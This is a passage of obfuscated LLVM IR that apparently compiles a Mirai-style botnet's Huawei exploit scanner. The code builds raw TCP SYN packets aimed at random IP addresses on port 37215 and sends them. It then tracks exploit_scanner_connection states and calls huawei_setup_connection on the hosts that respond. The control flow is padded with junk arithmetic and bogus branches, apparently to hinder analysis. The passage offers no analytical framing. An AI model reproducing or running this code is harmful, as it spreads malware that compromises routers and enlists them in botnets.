  %1391 = call zeroext i16 @ntohs(i16 zeroext %1390) #9
  %1392 = zext i16 %1391 to i32
  %1393 = icmp slt i32 %1392, 1024
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %155
  store %struct.iphdr* bitcast ([40 x i8]* @huawei_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %1394 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %1395 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1394, i64 1
  %1396 = bitcast %struct.iphdr* %1395 to %struct.anon.0*
  store %struct.anon.0* %1396, %struct.anon.0** %4, align 8
  %1397 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %1398 = bitcast %struct.iphdr* %1397 to i8*
  %1399 = load i8, i8* %1398, align 4
  %_21 = sub i8 0, %1399
  %gen22 = add i8 %_21, -16
  %_23 = sub i8 %1399, -16
  %gen24 = mul i8 %_23, -16
  %1400 = and i8 %1399, -16
  %_25 = sub i8 0, %1400
  %gen26 = add i8 %_25, 5
  %1401 = or i8 %1400, 5
  store i8 %1401, i8* %1398, align 4
  %1402 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %1403 = bitcast %struct.iphdr* %1402 to i8*
  %1404 = load i8, i8* %1403, align 4
  %_27 = sub i8 %1404, 15
  %gen28 = mul i8 %_27, 15
  %_29 = sub i8 %1404, 15
  %gen30 = mul i8 %_29, 15
  %_31 = shl i8 %1404, 15
  %_32 = sub i8 %1404, 15
  %gen33 = mul i8 %_32, 15
  %_34 = shl i8 %1404, 15
  %1405 = and i8 %1404, 15
  %_35 = sub i8 0, %1405
  %gen36 = add i8 %_35, 64
  %_37 = sub i8 %1405, 64
  %gen38 = mul i8 %_37, 64
  %_39 = sub i8 %1405, 64
  %gen40 = mul i8 %_39, 64
  %_41 = sub i8 %1405, 64
  %gen42 = mul i8 %_41, 64
  %_43 = shl i8 %1405, 64
  %_44 = sub i8 0, %1405
  %gen45 = add i8 %_44, 64
  %1406 = or i8 %1405, 64
  store i8 %1406, i8* %1403, align 4
  %1407 = call zeroext i16 @htons(i16 zeroext 40) #9
  %1408 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %1409 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1408, i32 0, i32 2
  store i16 %1407, i16* %1409, align 2
  %1410 = call i32 @rand_next()
  %1411 = trunc i32 %1410 to i16
  %1412 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %1413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1412, i32 0, i32 3
  store i16 %1411, i16* %1413, align 4
  %1414 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %1415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1414, i32 0, i32 5
  store i8 64, i8* %1415, align 4
  %1416 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %1417 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1416, i32 0, i32 6
  store i8 6, i8* %1417, align 1
  %1418 = call zeroext i16 @htons(i16 zeroext -28321) #9
  %1419 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %1420 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %1419, i32 0, i32 1
  store i16 %1418, i16* %1420, align 2
  %1421 = load i16, i16* %2, align 2
  %1422 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %1423 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %1422, i32 0, i32 0
  store i16 %1421, i16* %1423, align 4
  %1424 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %1425 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %1424, i32 0, i32 4
  %1426 = load i16, i16* %1425, align 4
  %_46 = shl i16 %1426, -241
  %_47 = sub i16 0, %1426
  %gen48 = add i16 %_47, -241
  %_49 = sub i16 %1426, -241
  %gen50 = mul i16 %_49, -241
  %_51 = shl i16 %1426, -241
  %_52 = sub i16 %1426, -241
  %gen53 = mul i16 %_52, -241
  %_54 = sub i16 0, %1426
  %gen55 = add i16 %_54, -241
  %_56 = sub i16 0, %1426
  %gen57 = add i16 %_56, -241
  %_58 = sub i16 %1426, -241
  %gen59 = mul i16 %_58, -241
  %1427 = and i16 %1426, -241
  %_60 = sub i16 %1427, 80
  %gen61 = mul i16 %_60, 80
  %_62 = shl i16 %1427, 80
  %_63 = sub i16 %1427, 80
  %gen64 = mul i16 %_63, 80
  %_65 = sub i16 0, %1427
  %gen66 = add i16 %_65, 80
  %_67 = sub i16 0, %1427
  %gen68 = add i16 %_67, 80
  %_69 = shl i16 %1427, 80
  %1428 = or i16 %1427, 80
  store i16 %1428, i16* %1425, align 4
  %1429 = call i32 @rand_next()
  %_70 = sub i32 %1429, 65535
  %gen71 = mul i32 %_70, 65535
  %_72 = sub i32 %1429, 65535
  %gen73 = mul i32 %_72, 65535
  %_74 = sub i32 %1429, 65535
  %gen75 = mul i32 %_74, 65535
  %_76 = sub i32 0, %1429
  %gen77 = add i32 %_76, 65535
  %_78 = shl i32 %1429, 65535
  %_79 = shl i32 %1429, 65535
  %_80 = shl i32 %1429, 65535
  %1430 = and i32 %1429, 65535
  %1431 = trunc i32 %1430 to i16
  %1432 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %1433 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %1432, i32 0, i32 5
  store i16 %1431, i16* %1433, align 2
  %1434 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %1435 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %1434, i32 0, i32 4
  %1436 = load i16, i16* %1435, align 4
  %_81 = sub i16 0, %1436
  %gen82 = add i16 %_81, -513
  %1437 = and i16 %1436, -513
  %_83 = sub i16 %1437, 512
  %gen84 = mul i16 %_83, 512
  %_85 = shl i16 %1437, 512
  %_86 = sub i16 0, %1437
  %gen87 = add i16 %_86, 512
  %_88 = sub i16 0, %1437
  %gen89 = add i16 %_88, 512
  %_90 = sub i16 0, %1437
  %gen91 = add i16 %_90, 512
  %_92 = shl i16 %1437, 512
  %1438 = or i16 %1437, 512
  store i16 %1438, i16* %1435, align 4
  br label %originalBB20

originalBB96alteredBB:                            ; preds = %originalBB96, %217
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %1439 = load i32, i32* @huawei_fake_time, align 4
  %1440 = load i32, i32* %10, align 4
  %1441 = icmp ne i32 %1439, %1440
  br label %originalBB96

originalBB100alteredBB:                           ; preds = %originalBB100, %239
  %1442 = load i32, i32* %1, align 4
  %1443 = icmp slt i32 %1442, 160
  br label %originalBB100

originalBB104alteredBB:                           ; preds = %originalBB104, %258
  %1444 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* %1444, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @huawei_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %1445 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %1446 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1445, i64 1
  %1447 = bitcast %struct.iphdr* %1446 to %struct.anon.0*
  store %struct.anon.0* %1447, %struct.anon.0** %16, align 8
  %1448 = call i32 @rand_next()
  %1449 = trunc i32 %1448 to i16
  %1450 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %1451 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1450, i32 0, i32 3
  store i16 %1449, i16* %1451, align 4
  %1452 = load i32, i32* @LOCAL_ADDR, align 4
  %1453 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %1454 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1453, i32 0, i32 8
  store i32 %1452, i32* %1454, align 4
  %1455 = call i32 @get_random_ip.76()
  %1456 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %1457 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1456, i32 0, i32 9
  store i32 %1455, i32* %1457, align 4
  %1458 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %1459 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1458, i32 0, i32 7
  store i16 0, i16* %1459, align 2
  %1460 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %1461 = bitcast %struct.iphdr* %1460 to i16*
  %1462 = call zeroext i16 @checksum_generic(i16* %1461, i32 20)
  %1463 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %1464 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1463, i32 0, i32 7
  store i16 %1462, i16* %1464, align 2
  %1465 = call zeroext i16 @htons(i16 zeroext -28321) #9
  %1466 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %1467 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %1466, i32 0, i32 1
  store i16 %1465, i16* %1467, align 2
  %1468 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %1469 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1468, i32 0, i32 9
  %1470 = load i32, i32* %1469, align 4
  %1471 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %1472 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %1471, i32 0, i32 2
  store i32 %1470, i32* %1472, align 4
  %1473 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %1474 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %1473, i32 0, i32 6
  store i16 0, i16* %1474, align 4
  %1475 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %1476 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %1477 = bitcast %struct.anon.0* %1476 to i8*
  %1478 = call zeroext i16 @htons(i16 zeroext 20) #9
  %1479 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %1475, i8* %1477, i16 zeroext %1478, i32 20)
  %1480 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %1481 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %1480, i32 0, i32 6
  store i16 %1479, i16* %1481, align 4
  %1482 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %1482, align 4
  %1483 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %1484 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1483, i32 0, i32 9
  %1485 = load i32, i32* %1484, align 4
  %1486 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %1487 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1486, i32 0, i32 0
  store i32 %1485, i32* %1487, align 4
  %1488 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %1489 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %1488, i32 0, i32 1
  %1490 = load i16, i16* %1489, align 2
  %1491 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %1490, i16* %1491, align 2
  %1492 = load i32, i32* @huawei_rsck, align 4
  %1493 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %1494 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %1494, %struct.sockaddr** %1493, align 8
  %1495 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %1496 = load %struct.sockaddr*, %struct.sockaddr** %1495, align 8
  %1497 = call i64 @sendto(i32 %1492, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %1496, i32 16)
  br label %originalBB104

originalBB108alteredBB:                           ; preds = %originalBB108, %350
  %1498 = call i32* @__errno_location() #9
  %1499 = load i32, i32* %1498, align 4
  %1500 = icmp eq i32 %1499, 11
  br label %originalBB108

originalBB112alteredBB:                           ; preds = %originalBB112, %370
  %1501 = call i32* @__errno_location() #9
  %1502 = load i32, i32* %1501, align 4
  %1503 = icmp eq i32 %1502, 11
  br label %originalBB112

originalBB116alteredBB:                           ; preds = %originalBB116, %409
  br label %originalBB116

originalBB120alteredBB:                           ; preds = %originalBB120, %467
  br label %originalBB120

originalBB124alteredBB:                           ; preds = %originalBB124, %484
  %1504 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %1505 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %1504, i32 0, i32 4
  %1506 = load i16, i16* %1505, align 4
  %_125 = sub i16 0, %1506
  %gen126 = add i16 %_125, 8
  %1507 = lshr i16 %1506, 8
  %1508 = and i16 %1507, 1
  %1509 = icmp ne i16 %1508, 0
  br label %originalBB124

originalBB130alteredBB:                           ; preds = %originalBB130, %507
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %559
  %1510 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %1511 = icmp eq %struct.exploit_scanner_connection* %1510, null
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %579
  %1512 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %1513 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1512, i32 0, i32 8
  %1514 = load i32, i32* %1513, align 4
  %1515 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %1516 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1515, i32 0, i32 3
  store i32 %1514, i32* %1516, align 4
  %1517 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %1518 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %1517, i32 0, i32 0
  %1519 = load i16, i16* %1518, align 4
  %1520 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %1521 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1520, i32 0, i32 4
  store i16 %1519, i16* %1521, align 8
  %1522 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  call void @huawei_setup_connection(%struct.exploit_scanner_connection* %1522)
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %607
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %624
  %1523 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %1524 = getelementptr inbounds [16 x i64], [16 x i64]* %1523, i64 0, i64 0
  %1525 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %1524) #6, !srcloc !3
  %1526 = extractvalue { i64, i64* } %1525, 0
  %1527 = extractvalue { i64, i64* } %1525, 1
  %1528 = trunc i64 %1526 to i32
  store i32 %1528, i32* %24, align 4
  %1529 = ptrtoint i64* %1527 to i64
  %1530 = trunc i64 %1529 to i32
  store i32 %1530, i32* %25, align 4
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %649
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %666
  %1531 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %1532 = getelementptr inbounds [16 x i64], [16 x i64]* %1531, i64 0, i64 0
  %1533 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %1532) #6, !srcloc !4
  %1534 = extractvalue { i64, i64* } %1533, 0
  %1535 = extractvalue { i64, i64* } %1533, 1
  %1536 = trunc i64 %1534 to i32
  store i32 %1536, i32* %26, align 4
  %1537 = ptrtoint i64* %1535 to i64
  %1538 = trunc i64 %1537 to i32
  store i32 %1538, i32* %27, align 4
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %712
  %1539 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1540 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1539, i32 0, i32 0
  %1541 = load i32, i32* %1540, align 8
  %1542 = call i32 @close(i32 %1541)
  %1543 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1544 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1543, i32 0, i32 0
  store i32 -1, i32* %1544, align 8
  %1545 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1546 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1545, i32 0, i32 2
  store i32 0, i32* %1546, align 8
  %1547 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1548 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1547, i32 0, i32 6
  %1549 = getelementptr inbounds [256 x i8], [256 x i8]* %1548, i32 0, i32 0
  call void @util_zero(i8* %1549, i32 256)
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %745
  %1550 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1551 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1550, i32 0, i32 2
  %1552 = load i32, i32* %1551, align 8
  %1553 = icmp eq i32 %1552, 3
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %766
  %1554 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1555 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1554, i32 0, i32 2
  %1556 = load i32, i32* %1555, align 8
  %1557 = icmp eq i32 %1556, 4
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %808
  %1558 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1559 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1558, i32 0, i32 0
  %1560 = load i32, i32* %1559, align 8
  store i32 %1560, i32* %12, align 4
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %829
  %1561 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1562 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1561, i32 0, i32 2
  %1563 = load i32, i32* %1562, align 8
  %1564 = icmp ne i32 %1563, 0
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %850
  %1565 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1566 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1565, i32 0, i32 0
  %1567 = load i32, i32* %1566, align 8
  %_179 = shl i32 %1567, 64
  %_180 = shl i32 %1567, 64
  %1568 = srem i32 %1567, 64
  %1569 = zext i32 %1568 to i64
  %_181 = sub i64 1, %1569
  %gen182 = mul i64 %_181, %1569
  %_183 = sub i64 1, %1569
  %gen184 = mul i64 %_183, %1569
  %_185 = sub i64 0, 1
  %gen186 = add i64 %_185, %1569
  %_187 = shl i64 1, %1569
  %_188 = sub i64 0, 1
  %gen189 = add i64 %_188, %1569
  %_190 = sub i64 1, %1569
  %gen191 = mul i64 %_190, %1569
  %_192 = sub i64 1, %1569
  %gen193 = mul i64 %_192, %1569
  %1570 = shl i64 1, %1569
  %1571 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %1572 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1573 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1572, i32 0, i32 0
  %1574 = load i32, i32* %1573, align 8
  %_194 = sub i32 %1574, 64
  %gen195 = mul i32 %_194, 64
  %_196 = sub i32 0, %1574
  %gen197 = add i32 %_196, 64
  %_198 = shl i32 %1574, 64
  %1575 = sdiv i32 %1574, 64
  %1576 = sext i32 %1575 to i64
  %1577 = getelementptr inbounds [16 x i64], [16 x i64]* %1571, i64 0, i64 %1576
  %1578 = load i64, i64* %1577, align 8
  %_199 = sub i64 0, %1578
  %gen200 = add i64 %_199, %1570
  %1579 = or i64 %1578, %1570
  store i64 %1579, i64* %1577, align 8
  %1580 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1581 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1580, i32 0, i32 0
  %1582 = load i32, i32* %1581, align 8
  %1583 = load i32, i32* %11, align 4
  %1584 = icmp sgt i32 %1582, %1583
  br label %originalBB178

originalBB204alteredBB:                           ; preds = %originalBB204, %887
  %1585 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1586 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1585, i32 0, i32 0
  %1587 = load i32, i32* %1586, align 8
  store i32 %1587, i32* %11, align 4
  br label %originalBB204

originalBB208alteredBB:                           ; preds = %originalBB208, %908
  br label %originalBB208

originalBB212alteredBB:                           ; preds = %originalBB212, %926
  %1588 = load i32, i32* %1, align 4
  %_213 = sub i32 0, %1588
  %gen214 = add i32 %_213, 1
  %1589 = add nsw i32 %1588, 1
  store i32 %1589, i32* %1, align 4
  br label %originalBB212

originalBB219alteredBB:                           ; preds = %originalBB219, %945
  %1590 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 1
  store i64 0, i64* %1590, align 8
  %1591 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 0
  store i64 1, i64* %1591, align 8
  %1592 = load i32, i32* %12, align 4
  %1593 = load i32, i32* %11, align 4
  %1594 = icmp sgt i32 %1592, %1593
  br label %originalBB219

originalBB223alteredBB:                           ; preds = %originalBB223, %967
  %1595 = load i32, i32* %12, align 4
  br label %originalBB223

originalBB227alteredBB:                           ; preds = %originalBB227, %985
  %1596 = load i32, i32* %11, align 4
  br label %originalBB227

originalBB231alteredBB:                           ; preds = %originalBB231, %1003
  %_232 = sub i32 0, 1
  %gen233 = add i32 %_232, %1004
  %_234 = sub i32 0, 1
  %gen235 = add i32 %_234, %1004
  %_236 = shl i32 1, %1004
  %1597 = add nsw i32 1, %1004
  %1598 = call i32 @select(i32 %1597, %struct.fd_set* %5, %struct.fd_set* %6, %struct.fd_set* null, %struct.timeval* %8)
  store i32 %1598, i32* %13, align 4
  %1599 = call i64 @time(i64* null) #6
  %1600 = trunc i64 %1599 to i32
  store i32 %1600, i32* @huawei_fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %originalBB231

originalBB240alteredBB:                           ; preds = %originalBB240, %1038
  %1601 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %1602 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1603 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1602, i32 0, i32 0
  %1604 = load i32, i32* %1603, align 8
  %_241 = sub i32 %1604, 64
  %gen242 = mul i32 %_241, 64
  %_243 = sub i32 0, %1604
  %gen244 = add i32 %_243, 64
  %_245 = sub i32 %1604, 64
  %gen246 = mul i32 %_245, 64
  %1605 = sdiv i32 %1604, 64
  %1606 = sext i32 %1605 to i64
  %1607 = getelementptr inbounds [16 x i64], [16 x i64]* %1601, i64 0, i64 %1606
  %1608 = load i64, i64* %1607, align 8
  %1609 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1610 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1609, i32 0, i32 0
  %1611 = load i32, i32* %1610, align 8
  %_247 = sub i32 %1611, 64
  %gen248 = mul i32 %_247, 64
  %_249 = sub i32 0, %1611
  %gen250 = add i32 %_249, 64
  %_251 = shl i32 %1611, 64
  %_252 = sub i32 %1611, 64
  %gen253 = mul i32 %_252, 64
  %_254 = sub i32 0, %1611
  %gen255 = add i32 %_254, 64
  %_256 = shl i32 %1611, 64
  %_257 = sub i32 0, %1611
  %gen258 = add i32 %_257, 64
  %1612 = srem i32 %1611, 64
  %1613 = zext i32 %1612 to i64
  %_259 = sub i64 0, 1
  %gen260 = add i64 %_259, %1613
  %_261 = sub i64 0, 1
  %gen262 = add i64 %_261, %1613
  %_263 = sub i64 0, 1
  %gen264 = add i64 %_263, %1613
  %_265 = sub i64 0, 1
  %gen266 = add i64 %_265, %1613
  %1614 = shl i64 1, %1613
  %_267 = shl i64 %1608, %1614
  %_268 = sub i64 %1608, %1614
  %gen269 = mul i64 %_268, %1614
  %_270 = sub i64 %1608, %1614
  %gen271 = mul i64 %_270, %1614
  %1615 = and i64 %1608, %1614
  %1616 = icmp ne i64 %1615, 0
  br label %originalBB240

originalBB275alteredBB:                           ; preds = %originalBB275, %1112
  %1617 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1618 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1617, i32 0, i32 2
  %1619 = load i32, i32* %1618, align 8
  %1620 = icmp eq i32 %1619, 4
  br label %originalBB275

originalBB279alteredBB:                           ; preds = %originalBB279, %1133
  %1621 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1622 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1621, i32 0, i32 0
  %1623 = load i32, i32* %1622, align 8
  %1624 = call i32 @close(i32 %1623)
  %1625 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1626 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1625, i32 0, i32 0
  store i32 -1, i32* %1626, align 8
  %1627 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1628 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1627, i32 0, i32 2
  store i32 0, i32* %1628, align 8
  br label %originalBB279

originalBB283alteredBB:                           ; preds = %originalBB283, %1173
  %1629 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %1630 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1631 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1630, i32 0, i32 0
  %1632 = load i32, i32* %1631, align 8
  %_284 = shl i32 %1632, 64
  %_285 = sub i32 0, %1632
  %gen286 = add i32 %_285, 64
  %_287 = sub i32 0, %1632
  %gen288 = add i32 %_287, 64
  %_289 = shl i32 %1632, 64
  %1633 = sdiv i32 %1632, 64
  %1634 = sext i32 %1633 to i64
  %1635 = getelementptr inbounds [16 x i64], [16 x i64]* %1629, i64 0, i64 %1634
  %1636 = load i64, i64* %1635, align 8
  %1637 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1638 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1637, i32 0, i32 0
  %1639 = load i32, i32* %1638, align 8
  %_290 = sub i32 %1639, 64
  %gen291 = mul i32 %_290, 64
  %_292 = sub i32 0, %1639
  %gen293 = add i32 %_292, 64
  %_294 = sub i32 %1639, 64
  %gen295 = mul i32 %_294, 64
  %1640 = srem i32 %1639, 64
  %1641 = zext i32 %1640 to i64
  %_296 = shl i64 1, %1641
  %_297 = sub i64 1, %1641
  %gen298 = mul i64 %_297, %1641
  %1642 = shl i64 1, %1641
  %_299 = sub i64 %1636, %1642
  %gen300 = mul i64 %_299, %1642
  %_301 = sub i64 0, %1636
  %gen302 = add i64 %_301, %1642
  %_303 = sub i64 %1636, %1642
  %gen304 = mul i64 %_303, %1642
  %_305 = sub i64 0, %1636
  %gen306 = add i64 %_305, %1642
  %_307 = sub i64 0, %1636
  %gen308 = add i64 %_307, %1642
  %1643 = and i64 %1636, %1642
  %1644 = icmp ne i64 %1643, 0
  br label %originalBB283

originalBB312alteredBB:                           ; preds = %originalBB312, %1207
  store i32 0, i32* %32, align 4
  %1645 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %1646 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %1645, i32 0, i32 2
  %1647 = load i32, i32* %1646, align 8
  %1648 = icmp eq i32 %1647, 0
  br label %originalBB312

originalBB316alteredBB:                           ; preds = %originalBB316, %1228
  br label %originalBB316

originalBB320alteredBB:                           ; preds = %originalBB320, %1284
  %1649 = load i32, i32* %32, align 4
  %1650 = icmp eq i32 %1649, -1
  br label %originalBB320

originalBB324alteredBB:                           ; preds = %originalBB324, %1355
  %1651 = load i32, i32* %1, align 4
  %_325 = shl i32 %1651, 1
  %_326 = sub i32 %1651, 1
  %gen327 = mul i32 %_326, 1
  %_328 = shl i32 %1651, 1
  %_329 = sub i32 0, %1651
  %gen330 = add i32 %_329, 1
  %_331 = sub i32 %1651, 1
  %gen332 = mul i32 %_331, 1
  %_333 = sub i32 0, %1651
  %gen334 = add i32 %_333, 1
  %_335 = shl i32 %1651, 1
  %1652 = add nsw i32 %1651, 1
  store i32 %1652, i32* %1, align 4
  br label %originalBB324
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip.76() #0 {
  %1 = load i32, i32* @x.59
  %2 = load i32, i32* @y.60
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  %13 = alloca i8, align 1
  %14 = alloca i8, align 1
